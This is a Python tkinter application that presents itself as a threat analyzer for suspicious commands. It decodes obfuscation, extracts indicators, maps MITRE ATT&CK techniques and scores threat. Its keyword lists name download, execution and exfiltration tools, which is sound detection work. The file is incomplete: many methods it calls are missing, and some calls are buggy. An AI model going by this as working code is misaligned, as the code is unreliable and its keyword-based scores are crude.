#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, Menu
import base64
import re
import json
import webbrowser
import threading
import hashlib
import socket
import urllib.parse
from datetime import datetime
import time
import os

# MITRE ATT&CK Mappings Database (expanded)
MITRE_TTP_DB = {
    "T1059.001": {
        "name": "Command and Scripting Interpreter: PowerShell",
        "url": "https://attack.mitre.org/techniques/T1059/001/"
    },
    "T1059.003": {
        "name": "Command and Scripting Interpreter: Windows Command Shell",
        "url": "https://attack.mitre.org/techniques/T1059/003/"
    },
    "T1105": {
        "name": "Ingress Tool Transfer",
        "url": "https://attack.mitre.org/techniques/T1105/"
    },
    "T1140": {
        "name": "Deobfuscate/Decode Files or Information",
        "url": "https://attack.mitre.org/techniques/T1140/"
    },
    "T1027": {
        "name": "Obfuscated Files or Information",
        "url": "https://attack.mitre.org/techniques/T1027/"
    },
    "T1566": {
        "name": "Phishing",
        "url": "https://attack.mitre.org/techniques/T1566/"
    },
    "T1071": {
        "name": "Application Layer Protocol",
        "url": "https://attack.mitre.org/techniques/T1071/"
    }
}

class CommandDecoderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("CommandDecoder Pro v2.0 - Advanced Threat Analyzer")
        self.root.geometry("1300x850")
        self.root.configure(bg="#1e1e1e")
        self.root.minsize(1000, 700)
        
        # Initialize history attributes first
        self.analysis_history = []
        self.history_file = "command_history.json"
        self.load_history_from_file()
        
        # Initialize other attributes
        self.current_iocs = []
        self.current_ttps = []
        self.calculated_score = 0.0
        
        # Setup UI and menu
        self.setup_menu()
        self.setup_ui()

    def setup_menu(self):  # <-- This should be at class level, not inside __init__
        menubar = Menu(self.root, bg="#252526", fg="#d4d4d4", activebackground="#3a3a3a")
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = Menu(menubar, tearoff=0)
        file_menu.add_command(label="New Analysis", command=self.new_analysis)
        file_menu.add_command(label="Save Results", command=self.save_results)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # Tools menu
        tools_menu = Menu(menubar, tearoff=0)
        tools_menu.add_command(label="Network Analyzer", command=self.open_network_analyzer)
        tools_menu.add_command(label="Payload Extractor", command=self.payload_extractor)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        
        # Help menu
        help_menu = Menu(menubar, tearoff=0)
        help_menu.add_command(label="Documentation", command=self.open_documentation)
        help_menu.add_separator()
        help_menu.add_command(label="About", command=self.show_about)
        menubar.add_cascade(label="Help", menu=help_menu)
    
    def setup_ui(self):
        # Configure styles
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('TFrame', background='#1e1e1e')
        style.configure('TNotebook', background='#252526', borderwidth=0)
        style.configure('TNotebook.Tab', background='#2d2d2d', foreground='#cccccc', 
                         padding=[15, 5], font=('Segoe UI', 10))
        style.map('TNotebook.Tab', 
                 background=[('selected', '#007acc'), ('active', '#3e3e40')],
                 foreground=[('selected', 'white')])
        
        style.configure('Treeview', background="#252526", fieldbackground="#252526", 
                       foreground="#d4d4d4", rowheight=25)
        style.map('Treeview', background=[('selected', '#007acc')])
        style.configure('Treeview.Heading', background="#333333", foreground="white")
        
        # Main notebook (tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Input Tab
        input_frame = ttk.Frame(self.notebook)
        self.notebook.add(input_frame, text="🔍 Command Input")
        self.setup_input_tab(input_frame)
        
        # Analysis Tab
        analysis_frame = ttk.Frame(self.notebook)
        self.notebook.add(analysis_frame, text="📊 Threat Analysis")
        self.setup_analysis_tab(analysis_frame)
        
        # IOC Tab
        ioc_frame = ttk.Frame(self.notebook)
        self.notebook.add(ioc_frame, text="🕵️ IOC Extraction")
        self.setup_ioc_tab(ioc_frame)
        
        # MITRE Tab
        mitre_frame = ttk.Frame(self.notebook)
        self.notebook.add(mitre_frame, text="🔗 MITRE ATT&CK")
        self.setup_mitre_tab(mitre_frame)
        
        # Behavior Tab (New)
        behavior_frame = ttk.Frame(self.notebook)
        self.notebook.add(behavior_frame, text="📝 Behavior Analysis")
        self.setup_behavior_tab(behavior_frame)
        
        # History Tab
        history_frame = ttk.Frame(self.notebook)
        self.notebook.add(history_frame, text="🕒 Analysis History")
        self.setup_history_tab(history_frame)
        
        # Status Bar with Progress
        self.status_frame = tk.Frame(self.root, bg="#007acc")
        self.status_frame.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.status = tk.Label(self.status_frame, text="Ready", bd=0, 
                             anchor=tk.W, bg="#007acc", fg="white", padx=10)
        self.status.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        self.progress = ttk.Progressbar(self.status_frame, orient=tk.HORIZONTAL, 
                                       mode='determinate', length=200)
        self.progress.pack(side=tk.RIGHT, padx=10, pady=2)
        
        # Threat Level Indicator
        self.threat_level = tk.Label(self.status_frame, text="⚪", font=("Arial", 14), 
                                   bg="#007acc", fg="white")
        self.threat_level.pack(side=tk.RIGHT, padx=10)
    
    def setup_input_tab(self, frame):
        # Header
        header = tk.Frame(frame, bg="#252526")
        header.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(header, text="Paste Suspicious Command:", bg="#252526", fg="#cccccc", 
                font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=10, pady=10)
        
        # Advanced options
        self.auto_decode = tk.BooleanVar(value=True)
        auto_decode_btn = ttk.Checkbutton(header, text="Auto Decode", variable=self.auto_decode)
        auto_decode_btn.pack(side=tk.RIGHT, padx=10)
        
        # Command input area
        input_container = tk.Frame(frame, bg="#1e1e1e")
        input_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        self.cmd_input = scrolledtext.ScrolledText(input_container, width=100, height=15, 
                                                 bg="#1e1e1e", fg="#dcdcdc", 
                                                 insertbackground="white", 
                                                 font=("Consolas", 11))
        self.cmd_input.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        
        # Buttons panel
        btn_frame = tk.Frame(frame, bg="#1e1e1e")
        btn_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Example buttons
        example_frame = tk.Frame(btn_frame, bg="#1e1e1e")
        example_frame.pack(side=tk.LEFT, fill=tk.X)
        
        tk.Label(example_frame, text="Examples:", bg="#1e1e1e", fg="#cccccc").pack(side=tk.LEFT)
        
        powershell_btn = tk.Button(example_frame, text="PowerShell", command=self.load_powershell_example,
                                  bg="#3e3e42", fg="white", relief=tk.FLAT, padx=10)
        powershell_btn.pack(side=tk.LEFT, padx=5)
        
        cmd_btn = tk.Button(example_frame, text="CMD", command=self.load_cmd_example,
                           bg="#3e3e42", fg="white", relief=tk.FLAT, padx=10)
        cmd_btn.pack(side=tk.LEFT, padx=5)
        
        bash_btn = tk.Button(example_frame, text="Bash", command=self.load_bash_example,
                           bg="#3e3e42", fg="white", relief=tk.FLAT, padx=10)
        bash_btn.pack(side=tk.LEFT, padx=5)
        
        # Action buttons
        action_frame = tk.Frame(btn_frame, bg="#1e1e1e")
        action_frame.pack(side=tk.RIGHT, fill=tk.X)
        
        clear_btn = tk.Button(action_frame, text="Clear", command=self.clear_input,
                            bg="#5e5e60", fg="white", relief=tk.FLAT, padx=15)
        clear_btn.pack(side=tk.RIGHT, padx=5)
        
        analyze_btn = tk.Button(action_frame, text="Analyze Command", command=self.start_analysis_thread,
                              bg="#007acc", fg="white", relief=tk.FLAT, padx=15,
                              font=("Segoe UI", 10, "bold"))
        analyze_btn.pack(side=tk.RIGHT, padx=5)
    
    def setup_analysis_tab(self, frame):
        # Two-column layout
        main_panel = tk.PanedWindow(frame, orient=tk.HORIZONTAL, bg="#1e1e1e", sashwidth=4)
        main_panel.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left panel - Threat Assessment
        left_frame = ttk.Frame(main_panel)
        main_panel.add(left_frame)
        
        # Threat Score Panel
        score_frame = ttk.LabelFrame(left_frame, text="Threat Assessment")
        score_frame.pack(fill=tk.BOTH, padx=10, pady=5, expand=True)
        
        # Score visualization
        canvas_frame = tk.Frame(score_frame, bg="#1e1e1e")
        canvas_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.score_canvas = tk.Canvas(canvas_frame, bg="#1e1e1e", highlightthickness=0)
        self.score_canvas.pack(fill=tk.BOTH, expand=True)
        
        # Threat indicators
        indicator_frame = tk.Frame(score_frame, bg="#1e1e1e")
        indicator_frame.pack(fill=tk.X, padx=20, pady=(0, 10))
        
        tk.Label(indicator_frame, text="Indicators:", bg="#1e1e1e", fg="#cccccc", 
               font=("Segoe UI", 9)).pack(anchor="w")
        
        self.indicators_text = scrolledtext.ScrolledText(indicator_frame, width=40, height=5,
                                                      bg="#1e1e1e", fg="#dcdcdc", 
                                                      state="disabled", font=("Segoe UI", 9))
        self.indicators_text.pack(fill=tk.X, padx=5, pady=5)
        
        # Right panel - Analysis Results
        right_frame = ttk.Frame(main_panel)
        main_panel.add(right_frame)
        
        # Deobfuscated Command Panel
        clean_frame = ttk.LabelFrame(right_frame, text="Deobfuscated Command")
        clean_frame.pack(fill=tk.BOTH, padx=10, pady=5, expand=True)
        
        self.clean_output = scrolledtext.ScrolledText(clean_frame, width=100, height=15,
                                                    bg="#1e1e1e", fg="#dcdcdc", state="disabled",
                                                    font=("Consolas", 10))
        self.clean_output.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Executive Summary Panel
        concl_frame = ttk.LabelFrame(right_frame, text="Executive Summary")
        concl_frame.pack(fill=tk.BOTH, padx=10, pady=5)
        
        self.conclusion_output = scrolledtext.ScrolledText(concl_frame, width=100, height=8,
                                                        bg="#1e1e1e", fg="#dcdcdc", state="disabled",
                                                        font=("Segoe UI", 10))
        self.conclusion_output.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
    
    def setup_ioc_tab(self, frame):
        # IOC controls
        control_frame = tk.Frame(frame, bg="#1e1e1e")
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(control_frame, text="Export IOCs", command=self.export_iocs,
                 bg="#3e3e42", fg="white", relief=tk.FLAT).pack(side=tk.RIGHT, padx=5)
        
        tk.Button(control_frame, text="Lookup IOC", command=self.ioc_lookup,
                 bg="#3e3e42", fg="white", relief=tk.FLAT).pack(side=tk.RIGHT, padx=5)
        
        # IOC Table
        table_frame = tk.Frame(frame, bg="#1e1e1e")
        table_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        columns = ("#", "Type", "Value", "Context", "Risk")
        self.ioc_tree = ttk.Treeview(table_frame, columns=columns, show="headings", selectmode="extended")
        
        for col in columns:
            self.ioc_tree.heading(col, text=col)
            self.ioc_tree.column(col, width=100, anchor="w")
        
        self.ioc_tree.column("#", width=40)
        self.ioc_tree.column("Type", width=80)
        self.ioc_tree.column("Risk", width=60)
        self.ioc_tree.column("Context", width=300)
        
        scrollbar = ttk.Scrollbar(table_frame, orient="vertical", command=self.ioc_tree.yview)
        self.ioc_tree.configure(yscrollcommand=scrollbar.set)
        
        self.ioc_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill="y")
        
        # Add context menu
        self.ioc_menu = Menu(self.ioc_tree, tearoff=0)
        self.ioc_menu.add_command(label="Copy Value", command=self.copy_ioc_value)
        self.ioc_menu.add_command(label="Search Online", command=self.search_ioc_online)
        self.ioc_tree.bind("<Button-3>", self.show_ioc_menu)
    
    def setup_mitre_tab(self, frame):
        # MITRE controls
        control_frame = tk.Frame(frame, bg="#1e1e1e")
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(control_frame, text="Open MITRE Website", command=self.open_mitre,
                 bg="#3e3e42", fg="white", relief=tk.FLAT).pack(side=tk.RIGHT, padx=5)
        
        # MITRE Table
        table_frame = tk.Frame(frame, bg="#1e1e1e")
        table_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        columns = ("ID", "Name", "Confidence", "Description")
        self.mitre_tree = ttk.Treeview(table_frame, columns=columns, show="headings", selectmode="browse")
        
        for col in columns:
            self.mitre_tree.heading(col, text=col)
            self.mitre_tree.column(col, width=120, anchor="w")
        
        self.mitre_tree.column("ID", width=100)
        self.mitre_tree.column("Name", width=200)
        self.mitre_tree.column("Confidence", width=80)
        
        scrollbar = ttk.Scrollbar(table_frame, orient="vertical", command=self.mitre_tree.yview)
        self.mitre_tree.configure(yscrollcommand=scrollbar.set)
        
        self.mitre_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill="y")
        
        # Add context menu
        self.mitre_menu = Menu(self.mitre_tree, tearoff=0)
        self.mitre_menu.add_command(label="View Details", command=self.open_mitre_technique)
        self.mitre_tree.bind("<Double-1>", self.open_mitre_technique)
        self.mitre_tree.bind("<Button-3>", self.show_mitre_menu)
    
    def setup_behavior_tab(self, frame):
        # Behavior analysis panel
        behavior_frame = ttk.LabelFrame(frame, text="Command Behavior Analysis")
        behavior_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Behavior categories
        categories = ["File Operations", "Network Activity", "System Changes", "Process Execution", "Data Exfiltration"]
        
        # Create behavior indicators
        self.behavior_vars = {}
        for cat in categories:
            cat_frame = tk.Frame(behavior_frame, bg="#1e1e1e")
            cat_frame.pack(fill=tk.X, padx=10, pady=5)
            
            tk.Label(cat_frame, text=cat, bg="#1e1e1e", fg="#cccccc", width=20, anchor="w").pack(side=tk.LEFT)
            
            # Status indicator
            status_frame = tk.Frame(cat_frame, bg="#1e1e1e")
            status_frame.pack(side=tk.RIGHT, fill=tk.X, expand=True)
            
            var = tk.StringVar(value="none")
            self.behavior_vars[cat] = var
            
            tk.Radiobutton(status_frame, text="None", variable=var, value="none", 
                          bg="#1e1e1e", fg="#cccccc", selectcolor="#1e1e1e").pack(side=tk.LEFT, padx=5)
            
            tk.Radiobutton(status_frame, text="Low", variable=var, value="low", 
                          bg="#1e1e1e", fg="#4CAF50", selectcolor="#1e1e1e").pack(side=tk.LEFT, padx=5)
            
            tk.Radiobutton(status_frame, text="Medium", variable=var, value="medium", 
                          bg="#1e1e1e", fg="#FFC107", selectcolor="#1e1e1e").pack(side=tk.LEFT, padx=5)
            
            tk.Radiobutton(status_frame, text="High", variable=var, value="high", 
                          bg="#1e1e1e", fg="#F44336", selectcolor="#1e1e1e").pack(side=tk.LEFT, padx=5)
        
        # YARA Rules Panel
        yara_frame = ttk.LabelFrame(frame, text="YARA Rule Generator")
        yara_frame.pack(fill=tk.BOTH, padx=10, pady=10)
        
        self.yara_output = scrolledtext.ScrolledText(yara_frame, width=100, height=8,
                                                   bg="#1e1e1e", fg="#dcdcdc", state="normal",
                                                   font=("Consolas", 10))
        self.yara_output.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        self.yara_output.insert(tk.END, "// YARA rules will be generated based on analysis\n")
        self.yara_output.config(state="disabled")
        
        # Generate button
        tk.Button(yara_frame, text="Generate YARA Rules", command=self.generate_yara_rules,
                 bg="#007acc", fg="white", relief=tk.FLAT).pack(pady=5)
    
    def setup_history_tab(self, frame):
        # History controls
        control_frame = tk.Frame(frame, bg="#1e1e1e")
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(control_frame, text="Clear History", command=self.clear_history,
                 bg="#d9534f", fg="white", relief=tk.FLAT).pack(side=tk.RIGHT, padx=5)
        
        tk.Button(control_frame, text="Export History", command=self.export_history,
                 bg="#3e3e42", fg="white", relief=tk.FLAT).pack(side=tk.RIGHT, padx=5)
        
        # History list with search
        search_frame = tk.Frame(frame, bg="#1e1e1e")
        search_frame.pack(fill=tk.X, padx=10, pady=(0, 5))
        
        tk.Label(search_frame, text="Search:", bg="#1e1e1e", fg="#cccccc").pack(side=tk.LEFT, padx=(0, 5))
        
        self.history_search = tk.Entry(search_frame, bg="#252526", fg="white", insertbackground="white")
        self.history_search.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.history_search.bind("<KeyRelease>", self.filter_history)
        
        # History Listbox
        list_frame = tk.Frame(frame, bg="#1e1e1e")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        scrollbar = tk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.history_list = tk.Listbox(list_frame, bg="#252526", fg="#dcdcdc", 
                                     selectbackground="#007acc", yscrollcommand=scrollbar.set,
                                     font=("Segoe UI", 10))
        self.history_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar.config(command=self.history_list.yview)
        
        # Populate history
        self.update_history_list()
        
        # Double-click to load
        self.history_list.bind("<Double-1>", lambda e: self.load_history())
    
    def start_analysis_thread(self):
        """Start analysis in a separate thread to keep UI responsive"""
        cmd = self.cmd_input.get("1.0", tk.END).strip()
        if not cmd:
            messagebox.showerror("Input Error", "Please enter a command to analyze")
            return
        
        # Disable analyze button during processing
        self.status.config(text="Starting analysis...")
        self.progress["value"] = 0
        self.threat_level.config(text="🔄")
        
        # Start thread
        thread = threading.Thread(target=self.analyze_command, args=(cmd,))
        thread.daemon = True
        thread.start()
    
    def analyze_command(self, cmd):
        """Perform command analysis with progress updates"""
        self.update_progress(10)
        
        # Save to history
        self.save_to_history(cmd)
        
        try:
            # Step 1: Decoding
            self.status.config(text="Decoding command...")
            decoded = self.decode_command(cmd)
            self.update_progress(30)
            
            # Step 2: IOC extraction
            self.status.config(text="Extracting IOCs...")
            iocs = self.extract_iocs(decoded)
            self.update_progress(50)
            
            # Step 3: MITRE mapping
            self.status.config(text="Mapping MITRE ATT&CK techniques...")
            ttps = self.map_mitre_ttps(decoded)
            self.update_progress(70)
            
            # Step 4: Behavior analysis
            self.status.config(text="Analyzing behavior...")
            behaviors = self.analyze_behavior(decoded)
            self.update_progress(80)
            
            # Step 5: Threat scoring
            self.status.config(text="Calculating threat score...")
            score = self.calculate_threat_score(decoded, iocs, ttps, behaviors)
            self.calculated_score = score
            self.update_progress(90)
            
            # Step 6: Generate conclusion
            conclusion = self.generate_conclusion(decoded, iocs, ttps, behaviors, score)
            
            # Update UI
            self.root.after(0, self.update_analysis_tab, decoded, conclusion, score, behaviors)
            self.root.after(0, self.update_ioc_tab, iocs)
            self.root.after(0, self.update_mitre_tab, ttps)
            self.root.after(0, self.update_behavior_tab, behaviors)
            
            self.root.after(0, self.status.config, "Analysis completed successfully")
            self.root.after(0, self.progress.stop)
            self.root.after(0, self.update_threat_level, score)
            
        except Exception as e:
            self.root.after(0, messagebox.showerror, "Analysis Error", f"Error during analysis: {str(e)}")
            self.root.after(0, self.status.config, f"Error: {str(e)}")
            self.root.after(0, self.progress.stop)
    
    def update_progress(self, value):
        """Update progress bar from any thread"""
        self.root.after(0, self.progress.config, {"value": value})
    
    def update_threat_level(self, score):
        """Update threat level indicator"""
        if score >= 8:
            self.threat_level.config(text="🔴", fg="#f44336")
        elif score >= 5:
            self.threat_level.config(text="🟠", fg="#ff9800")
        else:
            self.threat_level.config(text="🟢", fg="#4CAF50")
    
    def decode_command(self, cmd):
        """Advanced command decoding with multiple techniques"""
        decoded = cmd
        
        # Handle base64 encoded PowerShell commands
        if self.auto_decode.get() and ("powershell -enc" in cmd.lower() or "powershell -encodedcommand" in cmd.lower()):
            base64_str = cmd.split()[-1]
            try:
                decoded_bytes = base64.b64decode(base64_str)
                decoded = decoded_bytes.decode('utf-16le', errors='ignore')
            except:
                pass
        
        # Handle hex encoding
        if self.auto_decode.get() and re.search(r'\\x[0-9a-fA-F]{2}', decoded):
            decoded = re.sub(r'\\x([0-9a-fA-F]{2})', 
                            lambda m: chr(int(m.group(1), 16)), decoded)
        
        # Handle backtick removal (PowerShell obfuscation)
        if self.auto_decode.get() and '`' in decoded:
            decoded = decoded.replace('`', '')
        
        # Handle string reversal obfuscation
        if self.auto_decode.get() and '-join' in decoded and ']' in decoded and '[' in decoded:
            try:
                reversed_parts = re.findall(r'\[[^\]]*\]\s*-join\s*[\'\"]?', decoded)
                for part in reversed_parts:
                    clean_part = re.sub(r'[-join\[\]\s\'\"]', '', part)
                    reversed_str = clean_part[::-1]
                    decoded = decoded.replace(part, reversed_str)
            except:
                pass
        
        return decoded
    
    def extract_iocs(self, cmd):
        """Enhanced IOC extraction with deduplication and context"""
        iocs = []
        patterns = {
            "URL": r"(https?://[^\s\"\']+)",
            "IPv4": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
            "File Path": r"[A-Za-z]:\\(?:[^\\/:*?\"<>|\r\n]+\\)*[^\\/:*?\"<>|\r\n]*",
            "Domain": r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b",
            "Email": r"\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b",
            "MD5": r"\b[a-fA-F0-9]{32}\b",
            "SHA1": r"\b[a-fA-F0-9]{40}\b",
            "SHA256": r"\b[a-fA-F0-9]{64}\b",
            "IP:Port": r"\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b"
        }
        
        # Deduplication set
        seen = set()
        
        for ioc_type, pattern in patterns.items():
            matches = re.findall(pattern, cmd)
            for match in matches:
                # Normalize and deduplicate
                norm_match = match.lower().strip()
                if norm_match in seen:
                    continue
                seen.add(norm_match)
                
                # Get context
                start_idx = max(0, cmd.find(match) - 30)
                end_idx = min(len(cmd), cmd.find(match) + len(match) + 30)
                context = cmd[start_idx:end_idx]
                
                # Determine risk level
                risk = "High"
                if ioc_type in ["File Path", "Domain"]:
                    risk = "Medium"
                elif ioc_type == "Email":
                    risk = "Low"
                
                iocs.append({
                    "type": ioc_type,
                    "value": match,
                    "context": context,
                    "risk": risk
                })
        
        return iocs
    
    def map_mitre_ttps(self, cmd):
        """Enhanced MITRE ATT&CK mapping with more techniques"""
        ttps = []
        cmd_lower = cmd.lower()
        
        # PowerShell detection
        if "powershell" in cmd_lower or "pwsh" in cmd_lower:
            ttps.append({"id": "T1059.001", "confidence": "High"})
        
        # Command Shell detection
        if "cmd.exe" in cmd_lower or "command.com" in cmd_lower:
            ttps.append({"id": "T1059.003", "confidence": "High"})
        
        # File download detection
        if any(keyword in cmd_lower for keyword in ["curl", "wget", "webrequest", "download", "bitsadmin"]):
            ttps.append({"id": "T1105", "confidence": "High"})
        
        # Obfuscation detection
        if any(keyword in cmd_lower for keyword in ["base64", "-enc", "encode", "decode", "obfuscate"]):
            ttps.append({"id": "T1140", "confidence": "Medium"})
            ttps.append({"id": "T1027", "confidence": "Medium"})
        
        # Network activity
        if any(keyword in cmd_lower for keyword in ["http", "https", "ftp", "dns", "port", "socket"]):
            ttps.append({"id": "T1071", "confidence": "Medium"})
        
        # Phishing indicators
        if any(keyword in cmd_lower for keyword in ["phish", "credential", "password", "login"]):
            ttps.append({"id": "T1566", "confidence": "Medium"})
        
        return ttps
    
    def analyze_behavior(self, cmd):
        """Analyze command behavior patterns"""
        behaviors = {
            "File Operations": "none",
            "Network Activity": "none",
            "System Changes": "none",
            "Process Execution": "none",
            "Data Exfiltration": "none"
        }
        
        cmd_lower = cmd.lower()
        
        # File operations
        file_ops = ["copy", "move", "del", "rm", "rename", "write", "create", "modify"]
        if any(op in cmd_lower for op in file_ops):
            behaviors["File Operations"] = "medium"
        
        # Network activity
        network_ops = ["http", "https", "ftp", "dns", "port", "connect", "download", "upload"]
        if any(op in cmd_lower for op in network_ops):
            behaviors["Network Activity"] = "high"
        
        # System changes
        system_ops = ["reg add", "reg delete", "registry", "service", "task", "schtasks", "config"]
        if any(op in cmd_lower for op in system_ops):
            behaviors["System Changes"] = "high"
        
        # Process execution
        proc_ops = ["start", "run", "exec", "execute", "invoke", "iex", "wmic", "psexec"]
        if any(op in cmd_lower for op in proc_ops):
            behaviors["Process Execution"] = "high"
        
        # Data exfiltration
        exfil_ops = ["upload", "exfil", "send", "post", "mail", "ftp", "cloud", "dropbox"]
        if any(op in cmd_lower for op in exfil_ops):
            behaviors["Data Exfiltration"] = "high"
        
        return behaviors
    
    def calculate_threat_score(self, cmd, iocs, ttps, behaviors):
        """Calculate threat score with behavior analysis"""
        score = 0.0
        
        # Base score for suspicious keywords
        keywords = ["invoke", "iex", "download", "exec", "bypass", "encodedcommand", 
                   "malware", "virus", "exploit", "hack", "inject"]
        for keyword in keywords:
            if keyword in cmd.lower():
                score += 0.5
        
        # Add points for IOCs
        for ioc in iocs:
            if ioc["risk"] == "High":
                score += 1.0
            elif ioc["risk"] == "Medium":
                score += 0.5
            else:
                score += 0.2
        
        # Add points for MITRE techniques
        for ttp in ttps:
            if ttp["confidence"] == "High":
                score += 2.0
            elif ttp["confidence"] == "Medium":
                score += 1.0
            else:
                score += 0.5
        
        # Add points for behaviors
        behavior_scores = {
            "none": 0,
            "low": 0.5,
            "medium": 1.0,
            "high": 2.0
        }
        
        for behavior, level in behaviors.items():
            score += behavior_scores[level]
        
        # Cap at 10
        return min(score, 10.0)
    
    def generate_conclusion(self, decoded, iocs, ttps, behaviors, score):
        """Generate executive summary with behavior analysis"""
        conclusion = "COMMAND ANALYSIS REPORT\n\n"
        conclusion += f"Threat Level: {'🔴 CRITICAL' if score >= 8 else '🟠 HIGH' if score >= 6 else '🟡 MEDIUM' if score >= 4 else '🟢 LOW'}\n"
        conclusion += f"Threat Score: {score:.1f}/10.0\n\n"
        
        conclusion += "KEY FINDINGS:\n"
        conclusion += f"- Command appears to be {'HEAVILY OBFUSCATED' if 'base64' in decoded.lower() else 'PARTIALLY OBFUSCATED' if any(c in decoded for c in ['`', '\\x', 'join']) else 'CLEAR TEXT'}\n"
        
        if iocs:
            conclusion += f"- Extracted {len(iocs)} potential IOCs (URLs, IPs, files, etc.)\n"
        
        if ttps:
            conclusion += f"- Identified {len(ttps)} MITRE ATT&CK techniques\n"
        
        # Add behavior findings
        high_behaviors = [k for k, v in behaviors.items() if v == "high"]
        if high_behaviors:
            conclusion += f"- High-risk behaviors: {', '.join(high_behaviors)}\n"
        
        medium_behaviors = [k for k, v in behaviors.items() if v == "medium"]
        if medium_behaviors:
            conclusion += f"- Medium-risk behaviors: {', '.join(medium_behaviors)}\n"
        
        conclusion += "\nRECOMMENDED ACTIONS:\n"
        if score >= 8:
            conclusion += "⛔ IMMEDIATELY isolate affected systems\n"
            conclusion += "🔍 Conduct full forensic analysis\n"
            conclusion += "🌐 Block identified IOCs at network perimeter\n"
            conclusion += "📢 Notify incident response team\n"
        elif score >= 6:
            conclusion += "🔍 Investigate system for compromise indicators\n"
            conclusion += "📡 Monitor network traffic for suspicious activity\n"
            conclusion += "🔒 Review and strengthen endpoint security\n"
            conclusion += "📋 Create detection rules for identified TTPs\n"
        elif score >= 4:
            conclusion += "👀 Monitor system for suspicious activity\n"
            conclusion += "📝 Review command execution context\n"
            conclusion += "🛡️ Implement additional security controls\n"
            conclusion += "🧪 Test in sandbox environment\n"
        else:
            conclusion += "📌 Add to watchlist for future monitoring\n"
            conclusion += "📚 Review security documentation\n"
            conclusion += "🔄 Maintain regular security updates\n"
        
        conclusion += "\nANALYSIS TIMESTAMP: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return conclusion
    
    def update_analysis_tab(self, decoded, conclusion, score, behaviors):
        # Update threat score visualization
        self.score_canvas.delete("all")
        width = self.score_canvas.winfo_width()
        height = self.score_canvas.winfo_height()
        
        # Draw score arc
        start_angle = 180
        extent = (score / 10.0) * 180
        
        # Color based on score
        if score >= 8:
            color = "#f44336"  # Red
        elif score >= 5:
            color = "#ff9800"  # Orange
        else:
            color = "#4CAF50"  # Green
        
        self.score_canvas.create_arc(10, 10, width-10, height-10, 
                                    start=start_angle, extent=extent,
                                    fill=color, outline="")
        self.score_canvas.create_arc(10, 10, width-10, height-10, 
                                    start=start_angle+extent, extent=180-extent,
                                    fill="#333333", outline="")
        
        # Draw score text
        self.score_canvas.create_text(width/2, height/2, text=f"{score:.1f}", 
                                     font=("Arial", 24, "bold"), fill="white")
        
        # Update indicators
        indicators = []
        if score >= 8:
            indicators.append("🔴 Critical threat level detected")
        elif score >= 5:
            indicators.append("🟠 High threat level detected")
        
        if any(v == "high" for v in behaviors.values()):
            indicators.append("⚠️ High-risk behaviors identified")
        
        if "T1059.001" in [t['id'] for t in self.current_ttps]:
            indicators.append("⚡ PowerShell execution detected")
        
        if "T1140" in [t['id'] for t in self.current_ttps]:
            indicators.append("🔒 Command obfuscation detected")
        
        self.indicators_text.config(state="normal")
        self.indicators_text.delete("1.0", tk.END)
        self.indicators_text.insert(tk.END, "\n".join(indicators) if indicators else "No strong indicators detected")
        self.indicators_text.config(state="disabled")
        
        # Update cleaned command
        self.clean_output.config(state="normal")
        self.clean_output.delete("1.0", tk.END)
        self.clean_output.insert(tk.END, decoded)
        self.clean_output.config(state="disabled")
        
        # Update conclusion
        self.conclusion_output.config(state="normal")
        self.conclusion_output.delete("1.0", tk.END)
        self.conclusion_output.insert(tk.END, conclusion)
        self.conclusion_output.config(state="disabled")

    def update_ioc_tab(self, iocs):
        """Update the IOC tab with extracted indicators"""
        # Save for later use
        self.current_iocs = iocs
        
        # Clear existing items
        for item in self.ioc_tree.get_children():
            self.ioc_tree.delete(item)

        # Add new IOCs with color coding
        for idx, ioc in enumerate(iocs, 1):
            tags = ()
            if ioc["risk"] == "High":
                tags = ('high_risk',)
            elif ioc["risk"] == "Medium":
                tags = ('medium_risk',)

            self.ioc_tree.insert("", "end", values=(
                idx,
                ioc["type"],
                ioc["value"],
                ioc["context"],
                ioc["risk"]
            ), tags=tags)

        # Configure tag colors
        self.ioc_tree.tag_configure('high_risk', background='#331111')
        self.ioc_tree.tag_configure('medium_risk', background='#332211')

